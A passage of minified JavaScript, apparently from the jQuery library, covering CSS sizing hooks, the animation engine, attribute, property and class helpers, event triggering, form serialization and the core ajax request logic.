0;for(;a<4;a+=2)"margin"===n&&(u+=w.css(e,n+oe[a],!0,i)),r?("content"===n&&(u-=w.css(e,"padding"+oe[a],!0,i)),"margin"!==n&&(u-=w.css(e,"border"+oe[a]+"Width",!0,i))):(u+=w.css(e,"padding"+oe[a],!0,i),"padding"!==n?u+=w.css(e,"border"+oe[a]+"Width",!0,i):s+=w.css(e,"border"+oe[a]+"Width",!0,i));return!r&&o>=0&&(u+=Math.max(0,Math.ceil(e["offset"+t[0].toUpperCase()+t.slice(1)]-o-u-s-.5))),u}function et(e,t,n){var r=$e(e),i=Fe(e,t,r),o="border-box"===w.css(e,"boxSizing",!1,r),a=o;if(We.test(i)){if(!n)return i;i="auto"}return a=a&&(h.boxSizingReliable()||i===e.style[t]),("auto"===i||!parseFloat(i)&&"inline"===w.css(e,"display",!1,r))&&(i=e["offset"+t[0].toUpperCase()+t.slice(1)],a=!0),(i=parseFloat(i)||0)+Ze(e,t,n||(o?"border":"content"),a,r,i)+"px"}w.extend({cssHooks:{opacity:{get:function(e,t){if(t){var n=Fe(e,"opacity");return""===n?"1":n}}}},cssNumber:{animationIterationCount:!0,columnCount:!0,fillOpacity:!0,flexGrow:!0,flexShrink:!0,fontWeight:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{},style:function(e,t,n,r){if(e&&3!==e.nodeType&&8!==e.nodeType&&e.style){var i,o,a,s=G(t),u=Xe.test(t),l=e.style;if(u||(t=Je(s)),a=w.cssHooks[t]||w.cssHooks[s],void 0===n)return a&&"get"in a&&void 0!==(i=a.get(e,!1,r))?i:l[t];"string"==(o=typeof n)&&(i=ie.exec(n))&&i[1]&&(n=ue(e,t,i),o="number"),null!=n&&n===n&&("number"===o&&(n+=i&&i[3]||(w.cssNumber[s]?"":"px")),h.clearCloneStyle||""!==n||0!==t.indexOf("background")||(l[t]="inherit"),a&&"set"in a&&void 0===(n=a.set(e,n,r))||(u?l.setProperty(t,n):l[t]=n))}},css:function(e,t,n,r){var i,o,a,s=G(t);return Xe.test(t)||(t=Je(s)),(a=w.cssHooks[t]||w.cssHooks[s])&&"get"in a&&(i=a.get(e,!0,n)),void 0===i&&(i=Fe(e,t,r)),"normal"===i&&t in Ve&&(i=Ve[t]),""===n||n?(o=parseFloat(i),!0===n||isFinite(o)?o||0:i):i}}),w.each(["height","width"],function(e,t){w.cssHooks[t]={get:function(e,n,r){if(n)return!ze.test(w.css(e,"display"))||e.getClientRects().length&&e.getBoundingClientRect().width?et(e,t,r):se(e,Ue,function(){return et(e,t,r)})},set:function(e,n,r){var i,o=$e(e),a="border-box"===w.css(e,"boxSizing",!1,o),s=r&&Ze(e,t,r,a,o);return a&&h.scrollboxSize()===o.position&&(s-=Math.ceil(e["offset"+t[0].toUpperCase()+t.slice(1)]-parseFloat(o[t])-Ze(e,t,"border",!1,o)-.5)),s&&(i=ie.exec(n))&&"px"!==(i[3]||"px")&&(e.style[t]=n,n=w.css(e,t)),Ke(e,n,s)}}}),w.cssHooks.marginLeft=_e(h.reliableMarginLeft,function(e,t){if(t)return(parseFloat(Fe(e,"marginLeft"))||e.getBoundingClientRect().left-se(e,{marginLeft:0},function(){return e.getBoundingClientRect().left}))+"px"}),w.each({margin:"",padding:"",border:"Width"},function(e,t){w.cssHooks[e+t]={expand:function(n){for(var r=0,i={},o="string"==typeof n?n.split(" "):[n];r<4;r++)i[e+oe[r]+t]=o[r]||o[r-2]||o[0];return i}},"margin"!==e&&(w.cssHooks[e+t].set=Ke)}),w.fn.extend({css:function(e,t){return z(this,function(e,t,n){var r,i,o={},a=0;if(Array.isArray(t)){for(r=$e(e),i=t.length;a<i;a++)o[t[a]]=w.css(e,t[a],!1,r);return o}return void 0!==n?w.style(e,t,n):w.css(e,t)},e,t,arguments.length>1)}});function tt(e,t,n,r,i){return new tt.prototype.init(e,t,n,r,i)}w.Tween=tt,tt.prototype={constructor:tt,init:function(e,t,n,r,i,o){this.elem=e,this.prop=n,this.easing=i||w.easing._default,this.options=t,this.start=this.now=this.cur(),this.end=r,this.unit=o||(w.cssNumber[n]?"":"px")},cur:function(){var e=tt.propHooks[this.prop];return e&&e.get?e.get(this):tt.propHooks._default.get(this)},run:function(e){var t,n=tt.propHooks[this.prop];return this.options.duration?this.pos=t=w.easing[this.easing](e,this.options.duration*e,0,1,this.options.duration):this.pos=t=e,this.now=(this.end-this.start)*t+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),n&&n.set?n.set(this):tt.propHooks._default.set(this),this}},tt.prototype.init.prototype=tt.prototype,tt.propHooks={_default:{get:function(e){var t;return 1!==e.elem.nodeType||null!=e.elem[e.prop]&&null==e.elem.style[e.prop]?e.elem[e.prop]:(t=w.css(e.elem,e.prop,""))&&"auto"!==t?t:0},set:function(e){w.fx.step[e.prop]?w.fx.step[e.prop](e):1!==e.elem.nodeType||null==e.elem.style[w.cssProps[e.prop]]&&!w.cssHooks[e.prop]?e.elem[e.prop]=e.now:w.style(e.elem,e.prop,e.now+e.unit)}}},tt.propHooks.scrollTop=tt.propHooks.scrollLeft={set:function(e){e.elem.nodeType&&e.elem.parentNode&&(e.elem[e.prop]=e.now)}},w.easing={linear:function(e){return e},swing:function(e){return.5-Math.cos(e*Math.PI)/2},_default:"swing"},w.fx=tt.prototype.init,w.fx.step={};var nt,rt,it=/^(?:toggle|show|hide)$/,ot=/queueHooks$/;function at(){rt&&(!1===r.hidden&&e.requestAnimationFrame?e.requestAnimationFrame(at):e.setTimeout(at,w.fx.interval),w.fx.tick())}function st(){return e.setTimeout(function(){nt=void 0}),nt=Date.now()}function ut(e,t){var n,r=0,i={height:e};for(t=t?1:0;r<4;r+=2-t)i["margin"+(n=oe[r])]=i["padding"+n]=e;return t&&(i.opacity=i.width=e),i}function lt(e,t,n){for(var r,i=(pt.tweeners[t]||[]).concat(pt.tweeners["*"]),o=0,a=i.length;o<a;o++)if(r=i[o].call(n,t,e))return r}function ct(e,t,n){var r,i,o,a,s,u,l,c,f="width"in t||"height"in t,p=this,d={},h=e.style,g=e.nodeType&&ae(e),y=J.get(e,"fxshow");n.queue||(null==(a=w._queueHooks(e,"fx")).unqueued&&(a.unqueued=0,s=a.empty.fire,a.empty.fire=function(){a.unqueued||s()}),a.unqueued++,p.always(function(){p.always(function(){a.unqueued--,w.queue(e,"fx").length||a.empty.fire()})}));for(r in t)if(i=t[r],it.test(i)){if(delete t[r],o=o||"toggle"===i,i===(g?"hide":"show")){if("show"!==i||!y||void 0===y[r])continue;g=!0}d[r]=y&&y[r]||w.style(e,r)}if((u=!w.isEmptyObject(t))||!w.isEmptyObject(d)){f&&1===e.nodeType&&(n.overflow=[h.overflow,h.overflowX,h.overflowY],null==(l=y&&y.display)&&(l=J.get(e,"display")),"none"===(c=w.css(e,"display"))&&(l?c=l:(fe([e],!0),l=e.style.display||l,c=w.css(e,"display"),fe([e]))),("inline"===c||"inline-block"===c&&null!=l)&&"none"===w.css(e,"float")&&(u||(p.done(function(){h.display=l}),null==l&&(c=h.display,l="none"===c?"":c)),h.display="inline-block")),n.overflow&&(h.overflow="hidden",p.always(function(){h.overflow=n.overflow[0],h.overflowX=n.overflow[1],h.overflowY=n.overflow[2]})),u=!1;for(r in d)u||(y?"hidden"in y&&(g=y.hidden):y=J.access(e,"fxshow",{display:l}),o&&(y.hidden=!g),g&&fe([e],!0),p.done(function(){g||fe([e]),J.remove(e,"fxshow");for(r in d)w.style(e,r,d[r])})),u=lt(g?y[r]:0,r,p),r in y||(y[r]=u.start,g&&(u.end=u.start,u.start=0))}}function ft(e,t){var n,r,i,o,a;for(n in e)if(r=G(n),i=t[r],o=e[n],Array.isArray(o)&&(i=o[1],o=e[n]=o[0]),n!==r&&(e[r]=o,delete e[n]),(a=w.cssHooks[r])&&"expand"in a){o=a.expand(o),delete e[r];for(n in o)n in e||(e[n]=o[n],t[n]=i)}else t[r]=i}function pt(e,t,n){var r,i,o=0,a=pt.prefilters.length,s=w.Deferred().always(function(){delete u.elem}),u=function(){if(i)return!1;for(var t=nt||st(),n=Math.max(0,l.startTime+l.duration-t),r=1-(n/l.duration||0),o=0,a=l.tweens.length;o<a;o++)l.tweens[o].run(r);return s.notifyWith(e,[l,r,n]),r<1&&a?n:(a||s.notifyWith(e,[l,1,0]),s.resolveWith(e,[l]),!1)},l=s.promise({elem:e,props:w.extend({},t),opts:w.extend(!0,{specialEasing:{},easing:w.easing._default},n),originalProperties:t,originalOptions:n,startTime:nt||st(),duration:n.duration,tweens:[],createTween:function(t,n){var r=w.Tween(e,l.opts,t,n,l.opts.specialEasing[t]||l.opts.easing);return l.tweens.push(r),r},stop:function(t){var n=0,r=t?l.tweens.length:0;if(i)return this;for(i=!0;n<r;n++)l.tweens[n].run(1);return t?(s.notifyWith(e,[l,1,0]),s.resolveWith(e,[l,t])):s.rejectWith(e,[l,t]),this}}),c=l.props;for(ft(c,l.opts.specialEasing);o<a;o++)if(r=pt.prefilters[o].call(l,e,c,l.opts))return g(r.stop)&&(w._queueHooks(l.elem,l.opts.queue).stop=r.stop.bind(r)),r;return w.map(c,lt,l),g(l.opts.start)&&l.opts.start.call(e,l),l.progress(l.opts.progress).done(l.opts.done,l.opts.complete).fail(l.opts.fail).always(l.opts.always),w.fx.timer(w.extend(u,{elem:e,anim:l,queue:l.opts.queue})),l}w.Animation=w.extend(pt,{tweeners:{"*":[function(e,t){var n=this.createTween(e,t);return ue(n.elem,e,ie.exec(t),n),n}]},tweener:function(e,t){g(e)?(t=e,e=["*"]):e=e.match(M);for(var n,r=0,i=e.length;r<i;r++)n=e[r],pt.tweeners[n]=pt.tweeners[n]||[],pt.tweeners[n].unshift(t)},prefilters:[ct],prefilter:function(e,t){t?pt.prefilters.unshift(e):pt.prefilters.push(e)}}),w.speed=function(e,t,n){var r=e&&"object"==typeof e?w.extend({},e):{complete:n||!n&&t||g(e)&&e,duration:e,easing:n&&t||t&&!g(t)&&t};return w.fx.off?r.duration=0:"number"!=typeof r.duration&&(r.duration in w.fx.speeds?r.duration=w.fx.speeds[r.duration]:r.duration=w.fx.speeds._default),null!=r.queue&&!0!==r.queue||(r.queue="fx"),r.old=r.complete,r.complete=function(){g(r.old)&&r.old.call(this),r.queue&&w.dequeue(this,r.queue)},r},w.fn.extend({fadeTo:function(e,t,n,r){return this.filter(ae).css("opacity",0).show().end().animate({opacity:t},e,n,r)},animate:function(e,t,n,r){var i=w.isEmptyObject(e),o=w.speed(t,n,r),a=function(){var t=pt(this,w.extend({},e),o);(i||J.get(this,"finish"))&&t.stop(!0)};return a.finish=a,i||!1===o.queue?this.each(a):this.queue(o.queue,a)},stop:function(e,t,n){var r=function(e){var t=e.stop;delete e.stop,t(n)};return"string"!=typeof e&&(n=t,t=e,e=void 0),t&&!1!==e&&this.queue(e||"fx",[]),this.each(function(){var t=!0,i=null!=e&&e+"queueHooks",o=w.timers,a=J.get(this);if(i)a[i]&&a[i].stop&&r(a[i]);else for(i in a)a[i]&&a[i].stop&&ot.test(i)&&r(a[i]);for(i=o.length;i--;)o[i].elem!==this||null!=e&&o[i].queue!==e||(o[i].anim.stop(n),t=!1,o.splice(i,1));!t&&n||w.dequeue(this,e)})},finish:function(e){return!1!==e&&(e=e||"fx"),this.each(function(){var t,n=J.get(this),r=n[e+"queue"],i=n[e+"queueHooks"],o=w.timers,a=r?r.length:0;for(n.finish=!0,w.queue(this,e,[]),i&&i.stop&&i.stop.call(this,!0),t=o.length;t--;)o[t].elem===this&&o[t].queue===e&&(o[t].anim.stop(!0),o.splice(t,1));for(t=0;t<a;t++)r[t]&&r[t].finish&&r[t].finish.call(this);delete n.finish})}}),w.each(["toggle","show","hide"],function(e,t){var n=w.fn[t];w.fn[t]=function(e,r,i){return null==e||"boolean"==typeof e?n.apply(this,arguments):this.animate(ut(t,!0),e,r,i)}}),w.each({slideDown:ut("show"),slideUp:ut("hide"),slideToggle:ut("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(e,t){w.fn[e]=function(e,n,r){return this.animate(t,e,n,r)}}),w.timers=[],w.fx.tick=function(){var e,t=0,n=w.timers;for(nt=Date.now();t<n.length;t++)(e=n[t])()||n[t]!==e||n.splice(t--,1);n.length||w.fx.stop(),nt=void 0},w.fx.timer=function(e){w.timers.push(e),w.fx.start()},w.fx.interval=13,w.fx.start=function(){rt||(rt=!0,at())},w.fx.stop=function(){rt=null},w.fx.speeds={slow:600,fast:200,_default:400},w.fn.delay=function(t,n){return t=w.fx?w.fx.speeds[t]||t:t,n=n||"fx",this.queue(n,function(n,r){var i=e.setTimeout(n,t);r.stop=function(){e.clearTimeout(i)}})},function(){var e=r.createElement("input"),t=r.createElement("select").appendChild(r.createElement("option"));e.type="checkbox",h.checkOn=""!==e.value,h.optSelected=t.selected,(e=r.createElement("input")).value="t",e.type="radio",h.radioValue="t"===e.value}();var dt,ht=w.expr.attrHandle;w.fn.extend({attr:function(e,t){return z(this,w.attr,e,t,arguments.length>1)},removeAttr:function(e){return this.each(function(){w.removeAttr(this,e)})}}),w.extend({attr:function(e,t,n){var r,i,o=e.nodeType;if(3!==o&&8!==o&&2!==o)return"undefined"==typeof e.getAttribute?w.prop(e,t,n):(1===o&&w.isXMLDoc(e)||(i=w.attrHooks[t.toLowerCase()]||(w.expr.match.bool.test(t)?dt:void 0)),void 0!==n?null===n?void w.removeAttr(e,t):i&&"set"in i&&void 0!==(r=i.set(e,n,t))?r:(e.setAttribute(t,n+""),n):i&&"get"in i&&null!==(r=i.get(e,t))?r:null==(r=w.find.attr(e,t))?void 0:r)},attrHooks:{type:{set:function(e,t){if(!h.radioValue&&"radio"===t&&N(e,"input")){var n=e.value;return e.setAttribute("type",t),n&&(e.value=n),t}}}},removeAttr:function(e,t){var n,r=0,i=t&&t.match(M);if(i&&1===e.nodeType)while(n=i[r++])e.removeAttribute(n)}}),dt={set:function(e,t,n){return!1===t?w.removeAttr(e,n):e.setAttribute(n,n),n}},w.each(w.expr.match.bool.source.match(/\w+/g),function(e,t){var n=ht[t]||w.find.attr;ht[t]=function(e,t,r){var i,o,a=t.toLowerCase();return r||(o=ht[a],ht[a]=i,i=null!=n(e,t,r)?a:null,ht[a]=o),i}});var gt=/^(?:input|select|textarea|button)$/i,yt=/^(?:a|area)$/i;w.fn.extend({prop:function(e,t){return z(this,w.prop,e,t,arguments.length>1)},removeProp:function(e){return this.each(function(){delete this[w.propFix[e]||e]})}}),w.extend({prop:function(e,t,n){var r,i,o=e.nodeType;if(3!==o&&8!==o&&2!==o)return 1===o&&w.isXMLDoc(e)||(t=w.propFix[t]||t,i=w.propHooks[t]),void 0!==n?i&&"set"in i&&void 0!==(r=i.set(e,n,t))?r:e[t]=n:i&&"get"in i&&null!==(r=i.get(e,t))?r:e[t]},propHooks:{tabIndex:{get:function(e){var t=w.find.attr(e,"tabindex");return t?parseInt(t,10):gt.test(e.nodeName)||yt.test(e.nodeName)&&e.href?0:-1}}},propFix:{"for":"htmlFor","class":"className"}}),h.optSelected||(w.propHooks.selected={get:function(e){var t=e.parentNode;return t&&t.parentNode&&t.parentNode.selectedIndex,null},set:function(e){var t=e.parentNode;t&&(t.selectedIndex,t.parentNode&&t.parentNode.selectedIndex)}}),w.each(["tabIndex","readOnly","maxLength","cellSpacing","cellPadding","rowSpan","colSpan","useMap","frameBorder","contentEditable"],function(){w.propFix[this.toLowerCase()]=this});function vt(e){return(e.match(M)||[]).join(" ")}function mt(e){return e.getAttribute&&e.getAttribute("class")||""}function xt(e){return Array.isArray(e)?e:"string"==typeof e?e.match(M)||[]:[]}w.fn.extend({addClass:function(e){var t,n,r,i,o,a,s,u=0;if(g(e))return this.each(function(t){w(this).addClass(e.call(this,t,mt(this)))});if((t=xt(e)).length)while(n=this[u++])if(i=mt(n),r=1===n.nodeType&&" "+vt(i)+" "){a=0;while(o=t[a++])r.indexOf(" "+o+" ")<0&&(r+=o+" ");i!==(s=vt(r))&&n.setAttribute("class",s)}return this},removeClass:function(e){var t,n,r,i,o,a,s,u=0;if(g(e))return this.each(function(t){w(this).removeClass(e.call(this,t,mt(this)))});if(!arguments.length)return this.attr("class","");if((t=xt(e)).length)while(n=this[u++])if(i=mt(n),r=1===n.nodeType&&" "+vt(i)+" "){a=0;while(o=t[a++])while(r.indexOf(" "+o+" ")>-1)r=r.replace(" "+o+" "," ");i!==(s=vt(r))&&n.setAttribute("class",s)}return this},toggleClass:function(e,t){var n=typeof e,r="string"===n||Array.isArray(e);return"boolean"==typeof t&&r?t?this.addClass(e):this.removeClass(e):g(e)?this.each(function(n){w(this).toggleClass(e.call(this,n,mt(this),t),t)}):this.each(function(){var t,i,o,a;if(r){i=0,o=w(this),a=xt(e);while(t=a[i++])o.hasClass(t)?o.removeClass(t):o.addClass(t)}else void 0!==e&&"boolean"!==n||((t=mt(this))&&J.set(this,"__className__",t),this.setAttribute&&this.setAttribute("class",t||!1===e?"":J.get(this,"__className__")||""))})},hasClass:function(e){var t,n,r=0;t=" "+e+" ";while(n=this[r++])if(1===n.nodeType&&(" "+vt(mt(n))+" ").indexOf(t)>-1)return!0;return!1}});var bt=/\r/g;w.fn.extend({val:function(e){var t,n,r,i=this[0];{if(arguments.length)return r=g(e),this.each(function(n){var i;1===this.nodeType&&(null==(i=r?e.call(this,n,w(this).val()):e)?i="":"number"==typeof i?i+="":Array.isArray(i)&&(i=w.map(i,function(e){return null==e?"":e+""})),(t=w.valHooks[this.type]||w.valHooks[this.nodeName.toLowerCase()])&&"set"in t&&void 0!==t.set(this,i,"value")||(this.value=i))});if(i)return(t=w.valHooks[i.type]||w.valHooks[i.nodeName.toLowerCase()])&&"get"in t&&void 0!==(n=t.get(i,"value"))?n:"string"==typeof(n=i.value)?n.replace(bt,""):null==n?"":n}}}),w.extend({valHooks:{option:{get:function(e){var t=w.find.attr(e,"value");return null!=t?t:vt(w.text(e))}},select:{get:function(e){var t,n,r,i=e.options,o=e.selectedIndex,a="select-one"===e.type,s=a?null:[],u=a?o+1:i.length;for(r=o<0?u:a?o:0;r<u;r++)if(((n=i[r]).selected||r===o)&&!n.disabled&&(!n.parentNode.disabled||!N(n.parentNode,"optgroup"))){if(t=w(n).val(),a)return t;s.push(t)}return s},set:function(e,t){var n,r,i=e.options,o=w.makeArray(t),a=i.length;while(a--)((r=i[a]).selected=w.inArray(w.valHooks.option.get(r),o)>-1)&&(n=!0);return n||(e.selectedIndex=-1),o}}}}),w.each(["radio","checkbox"],function(){w.valHooks[this]={set:function(e,t){if(Array.isArray(t))return e.checked=w.inArray(w(e).val(),t)>-1}},h.checkOn||(w.valHooks[this].get=function(e){return null===e.getAttribute("value")?"on":e.value})}),h.focusin="onfocusin"in e;var wt=/^(?:focusinfocus|focusoutblur)$/,Tt=function(e){e.stopPropagation()};w.extend(w.event,{trigger:function(t,n,i,o){var a,s,u,l,c,p,d,h,v=[i||r],m=f.call(t,"type")?t.type:t,x=f.call(t,"namespace")?t.namespace.split("."):[];if(s=h=u=i=i||r,3!==i.nodeType&&8!==i.nodeType&&!wt.test(m+w.event.triggered)&&(m.indexOf(".")>-1&&(m=(x=m.split(".")).shift(),x.sort()),c=m.indexOf(":")<0&&"on"+m,t=t[w.expando]?t:new w.Event(m,"object"==typeof t&&t),t.isTrigger=o?2:3,t.namespace=x.join("."),t.rnamespace=t.namespace?new RegExp("(^|\\.)"+x.join("\\.(?:.*\\.|)")+"(\\.|$)"):null,t.result=void 0,t.target||(t.target=i),n=null==n?[t]:w.makeArray(n,[t]),d=w.event.special[m]||{},o||!d.trigger||!1!==d.trigger.apply(i,n))){if(!o&&!d.noBubble&&!y(i)){for(l=d.delegateType||m,wt.test(l+m)||(s=s.parentNode);s;s=s.parentNode)v.push(s),u=s;u===(i.ownerDocument||r)&&v.push(u.defaultView||u.parentWindow||e)}a=0;while((s=v[a++])&&!t.isPropagationStopped())h=s,t.type=a>1?l:d.bindType||m,(p=(J.get(s,"events")||{})[t.type]&&J.get(s,"handle"))&&p.apply(s,n),(p=c&&s[c])&&p.apply&&Y(s)&&(t.result=p.apply(s,n),!1===t.result&&t.preventDefault());return t.type=m,o||t.isDefaultPrevented()||d._default&&!1!==d._default.apply(v.pop(),n)||!Y(i)||c&&g(i[m])&&!y(i)&&((u=i[c])&&(i[c]=null),w.event.triggered=m,t.isPropagationStopped()&&h.addEventListener(m,Tt),i[m](),t.isPropagationStopped()&&h.removeEventListener(m,Tt),w.event.triggered=void 0,u&&(i[c]=u)),t.result}},simulate:function(e,t,n){var r=w.extend(new w.Event,n,{type:e,isSimulated:!0});w.event.trigger(r,null,t)}}),w.fn.extend({trigger:function(e,t){return this.each(function(){w.event.trigger(e,t,this)})},triggerHandler:function(e,t){var n=this[0];if(n)return w.event.trigger(e,t,n,!0)}}),h.focusin||w.each({focus:"focusin",blur:"focusout"},function(e,t){var n=function(e){w.event.simulate(t,e.target,w.event.fix(e))};w.event.special[t]={setup:function(){var r=this.ownerDocument||this,i=J.access(r,t);i||r.addEventListener(e,n,!0),J.access(r,t,(i||0)+1)},teardown:function(){var r=this.ownerDocument||this,i=J.access(r,t)-1;i?J.access(r,t,i):(r.removeEventListener(e,n,!0),J.remove(r,t))}}});var Ct=e.location,Et=Date.now(),kt=/\?/;w.parseXML=function(t){var n;if(!t||"string"!=typeof t)return null;try{n=(new e.DOMParser).parseFromString(t,"text/xml")}catch(e){n=void 0}return n&&!n.getElementsByTagName("parsererror").length||w.error("Invalid XML: "+t),n};var St=/\[\]$/,Dt=/\r?\n/g,Nt=/^(?:submit|button|image|reset|file)$/i,At=/^(?:input|select|textarea|keygen)/i;function jt(e,t,n,r){var i;if(Array.isArray(t))w.each(t,function(t,i){n||St.test(e)?r(e,i):jt(e+"["+("object"==typeof i&&null!=i?t:"")+"]",i,n,r)});else if(n||"object"!==x(t))r(e,t);else for(i in t)jt(e+"["+i+"]",t[i],n,r)}w.param=function(e,t){var n,r=[],i=function(e,t){var n=g(t)?t():t;r[r.length]=encodeURIComponent(e)+"="+encodeURIComponent(null==n?"":n)};if(Array.isArray(e)||e.jquery&&!w.isPlainObject(e))w.each(e,function(){i(this.name,this.value)});else for(n in e)jt(n,e[n],t,i);return r.join("&")},w.fn.extend({serialize:function(){return w.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=w.prop(this,"elements");return e?w.makeArray(e):this}).filter(function(){var e=this.type;return this.name&&!w(this).is(":disabled")&&At.test(this.nodeName)&&!Nt.test(e)&&(this.checked||!pe.test(e))}).map(function(e,t){var n=w(this).val();return null==n?null:Array.isArray(n)?w.map(n,function(e){return{name:t.name,value:e.replace(Dt,"\r\n")}}):{name:t.name,value:n.replace(Dt,"\r\n")}}).get()}});var qt=/%20/g,Lt=/#.*$/,Ht=/([?&])_=[^&]*/,Ot=/^(.*?):[ \t]*([^\r\n]*)$/gm,Pt=/^(?:about|app|app-storage|.+-extension|file|res|widget):$/,Mt=/^(?:GET|HEAD)$/,Rt=/^\/\//,It={},Wt={},$t="*/".concat("*"),Bt=r.createElement("a");Bt.href=Ct.href;function Ft(e){return function(t,n){"string"!=typeof t&&(n=t,t="*");var r,i=0,o=t.toLowerCase().match(M)||[];if(g(n))while(r=o[i++])"+"===r[0]?(r=r.slice(1)||"*",(e[r]=e[r]||[]).unshift(n)):(e[r]=e[r]||[]).push(n)}}function _t(e,t,n,r){var i={},o=e===Wt;function a(s){var u;return i[s]=!0,w.each(e[s]||[],function(e,s){var l=s(t,n,r);return"string"!=typeof l||o||i[l]?o?!(u=l):void 0:(t.dataTypes.unshift(l),a(l),!1)}),u}return a(t.dataTypes[0])||!i["*"]&&a("*")}function zt(e,t){var n,r,i=w.ajaxSettings.flatOptions||{};for(n in t)void 0!==t[n]&&((i[n]?e:r||(r={}))[n]=t[n]);return r&&w.extend(!0,e,r),e}function Xt(e,t,n){var r,i,o,a,s=e.contents,u=e.dataTypes;while("*"===u[0])u.shift(),void 0===r&&(r=e.mimeType||t.getResponseHeader("Content-Type"));if(r)for(i in s)if(s[i]&&s[i].test(r)){u.unshift(i);break}if(u[0]in n)o=u[0];else{for(i in n){if(!u[0]||e.converters[i+" "+u[0]]){o=i;break}a||(a=i)}o=o||a}if(o)return o!==u[0]&&u.unshift(o),n[o]}function Ut(e,t,n,r){var i,o,a,s,u,l={},c=e.dataTypes.slice();if(c[1])for(a in e.converters)l[a.toLowerCase()]=e.converters[a];o=c.shift();while(o)if(e.responseFields[o]&&(n[e.responseFields[o]]=t),!u&&r&&e.dataFilter&&(t=e.dataFilter(t,e.dataType)),u=o,o=c.shift())if("*"===o)o=u;else if("*"!==u&&u!==o){if(!(a=l[u+" "+o]||l["* "+o]))for(i in l)if((s=i.split(" "))[1]===o&&(a=l[u+" "+s[0]]||l["* "+s[0]])){!0===a?a=l[i]:!0!==l[i]&&(o=s[0],c.unshift(s[1]));break}if(!0!==a)if(a&&e["throws"])t=a(t);else try{t=a(t)}catch(e){return{state:"parsererror",error:a?e:"No conversion from "+u+" to "+o}}}return{state:"success",data:t}}w.extend({active:0,lastModified:{},etag:{},ajaxSettings:{url:Ct.href,type:"GET",isLocal:Pt.test(Ct.protocol),global:!0,processData:!0,async:!0,contentType:"application/x-www-form-urlencoded; charset=UTF-8",accepts:{"*":$t,text:"text/plain",html:"text/html",xml:"application/xml, text/xml",json:"application/json, text/javascript"},contents:{xml:/\bxml\b/,html:/\bhtml/,json:/\bjson\b/},responseFields:{xml:"responseXML",text:"responseText",json:"responseJSON"},converters:{"* text":String,"text html":!0,"text json":JSON.parse,"text xml":w.parseXML},flatOptions:{url:!0,context:!0}},ajaxSetup:function(e,t){return t?zt(zt(e,w.ajaxSettings),t):zt(w.ajaxSettings,e)},ajaxPrefilter:Ft(It),ajaxTransport:Ft(Wt),ajax:function(t,n){"object"==typeof t&&(n=t,t=void 0),n=n||{};var i,o,a,s,u,l,c,f,p,d,h=w.ajaxSetup({},n),g=h.context||h,y=h.context&&(g.nodeType||g.jquery)?w(g):w.event,v=w.Deferred(),m=w.Callbacks("once memory"),x=h.statusCode||{},b={},T={},C="canceled",E={readyState:0,getResponseHeader:function(e){var t;if(c){if(!s){s={};while(t=Ot.exec(a))s[t[1].toLowerCase()]=t[2]}t=s[e.toLowerCase()]}return null==t?null:t},getAllResponseHeaders:function(){return c?a:null},setRequestHeader:function(e,t){return null==c&&(e=T[e.toLowerCase()]=T[e.toLowerCase()]||e,b[e]=t),this},overrideMimeType:function(e){return null==c&&(h.mimeType=e),this},statusCode:function(e){var t;if(e)if(c)E.always(e[E.status]);else for(t in e)x[t]=[x[t],e[t]];return this},abort:function(e){var t=e||C;return i&&i.abort(t),k(0,t),this}};if(v.promise(E),h.url=((t||h.url||Ct.href)+"").replace(Rt,Ct.protocol+"//"),h.type=n.method||n.type||h.method||h.type,h.dataTypes=(h.dataType||"*").toLowerCase().match(M)||[""],null==h.crossDomain){l=r.createElement("a");try{l.href=h.url,l.href=l.href,h.crossDomain=Bt.protocol+"//"+Bt.host!=l.protocol+"//"+l.host}catch(e){h.crossDomain=!0}}if(h.data&&h.processData&&"string"!=typeof h.data&&(h.data=w.param(h.data,h.traditional)),_t(It,h,n,E),c)return E;(f=w.event&&h.global)&&0==w.active++&&w.event.trigger("ajaxStart"),h.type=h.type.toUpperCase(),h.hasContent=!Mt.test(h.type),o=h.url.replace(Lt,""),h.hasContent?h.data&&h.processData&&0===(h.contentType||"").indexOf("application/x-www-form-urlencoded")&&(h.data=h.data.replace(qt,"+")):(d=h.url.slice(o.length),h.data&&(h.processData||"string"==typeof h.data)&&(o+=(kt.test(o)?"&":"?")+h.data,delete h.data),!1===h.cache&&(o=o.replace(Ht,"$1"),d=(kt.test(o)?"&":"?")+"_="+Et+++d),h.url=o+d),h.ifModified&&(w.lastModified[o]&&E.setRequestHeader("If-Modified-Since",w.lastModified[o]),w.etag[o]&&E.setRequestHeader("If-None-Match",w.etag[o])),(h.data&&h.hasContent&&!1!==h.contentType||n.contentType)&&E.setRequestHeader("Content-Type",h.contentType),E.setRequestHeader("Accept",h.dataTypes[0]&&h.accepts[h.dataTypes[0]]?h.accepts[h.dataTypes[0]]+("*"!==h.dataTypes[0]?", "+$t+"; q=0.01":""):h.accepts["*"]);for(p in h.headers)E.setRequestHeader(p,h.headers[p]);if(h.beforeSend&&(!1===h.beforeSend.call(g,E,h)||c))return E.abort();if(C="abort",m.add(h.complete),E.done(h.success),E.fail(h.error),i=_t(Wt,h,n,E)){if(E.readyState=1,f&&y.trigger("ajaxSend",[E,h]),c)return E;h.async&&h.timeout>0&&(u=e.setTimeout(function(){E.abort("timeout")},h.timeout));try{c=!1,i.send(b,k)}catch(e){if(c)throw e;k(-1,e)}}else k(-1,"No Transport");function k(t,n,r,s){var l,p,d,b,T,C=n;c||(c=!0,u&&e.clearTimeout(u),i=void 0,a=s||"",E.readyState=t>0?4:0,l=t>=200&&t<300||304===t,r&&(b=Xt(h,E,r)),b=Ut(h,b,E,l),l?(h.ifModified&&((T=E.getResponseHeader("Last-Modified"))&&(w.lastModified[o]=T),(T=E.getResponseHeader("etag"))&&(w.etag[o]=T)),204===t||"HEAD"===h.type?C="nocontent":304===t?C="notmodified":(C=b.state,p=b.data,l=!(d=b.error))):(d=C,!t&&C||(C="error",t<0&&(t=0))),E.status=t,E.statusText=(n||C)+"",l?v.resolveWith(g,[p,C,E]):v.rejectWith(g,[E,C,d]),E.statusCode(x),x=void 0,f&&y.trigger(l?"ajaxSuccess":"ajaxError",[E,h,l?p:d]),m.fireWith(g,[E,C]),f&&(y.trigger("ajaxComplete",[E,h]),--w.active||w.event.trigger("ajaxStop")))}return E},getJSON:function(e,t,n){return w.get(e,t,n,"json")},getScript:function(e,t){return 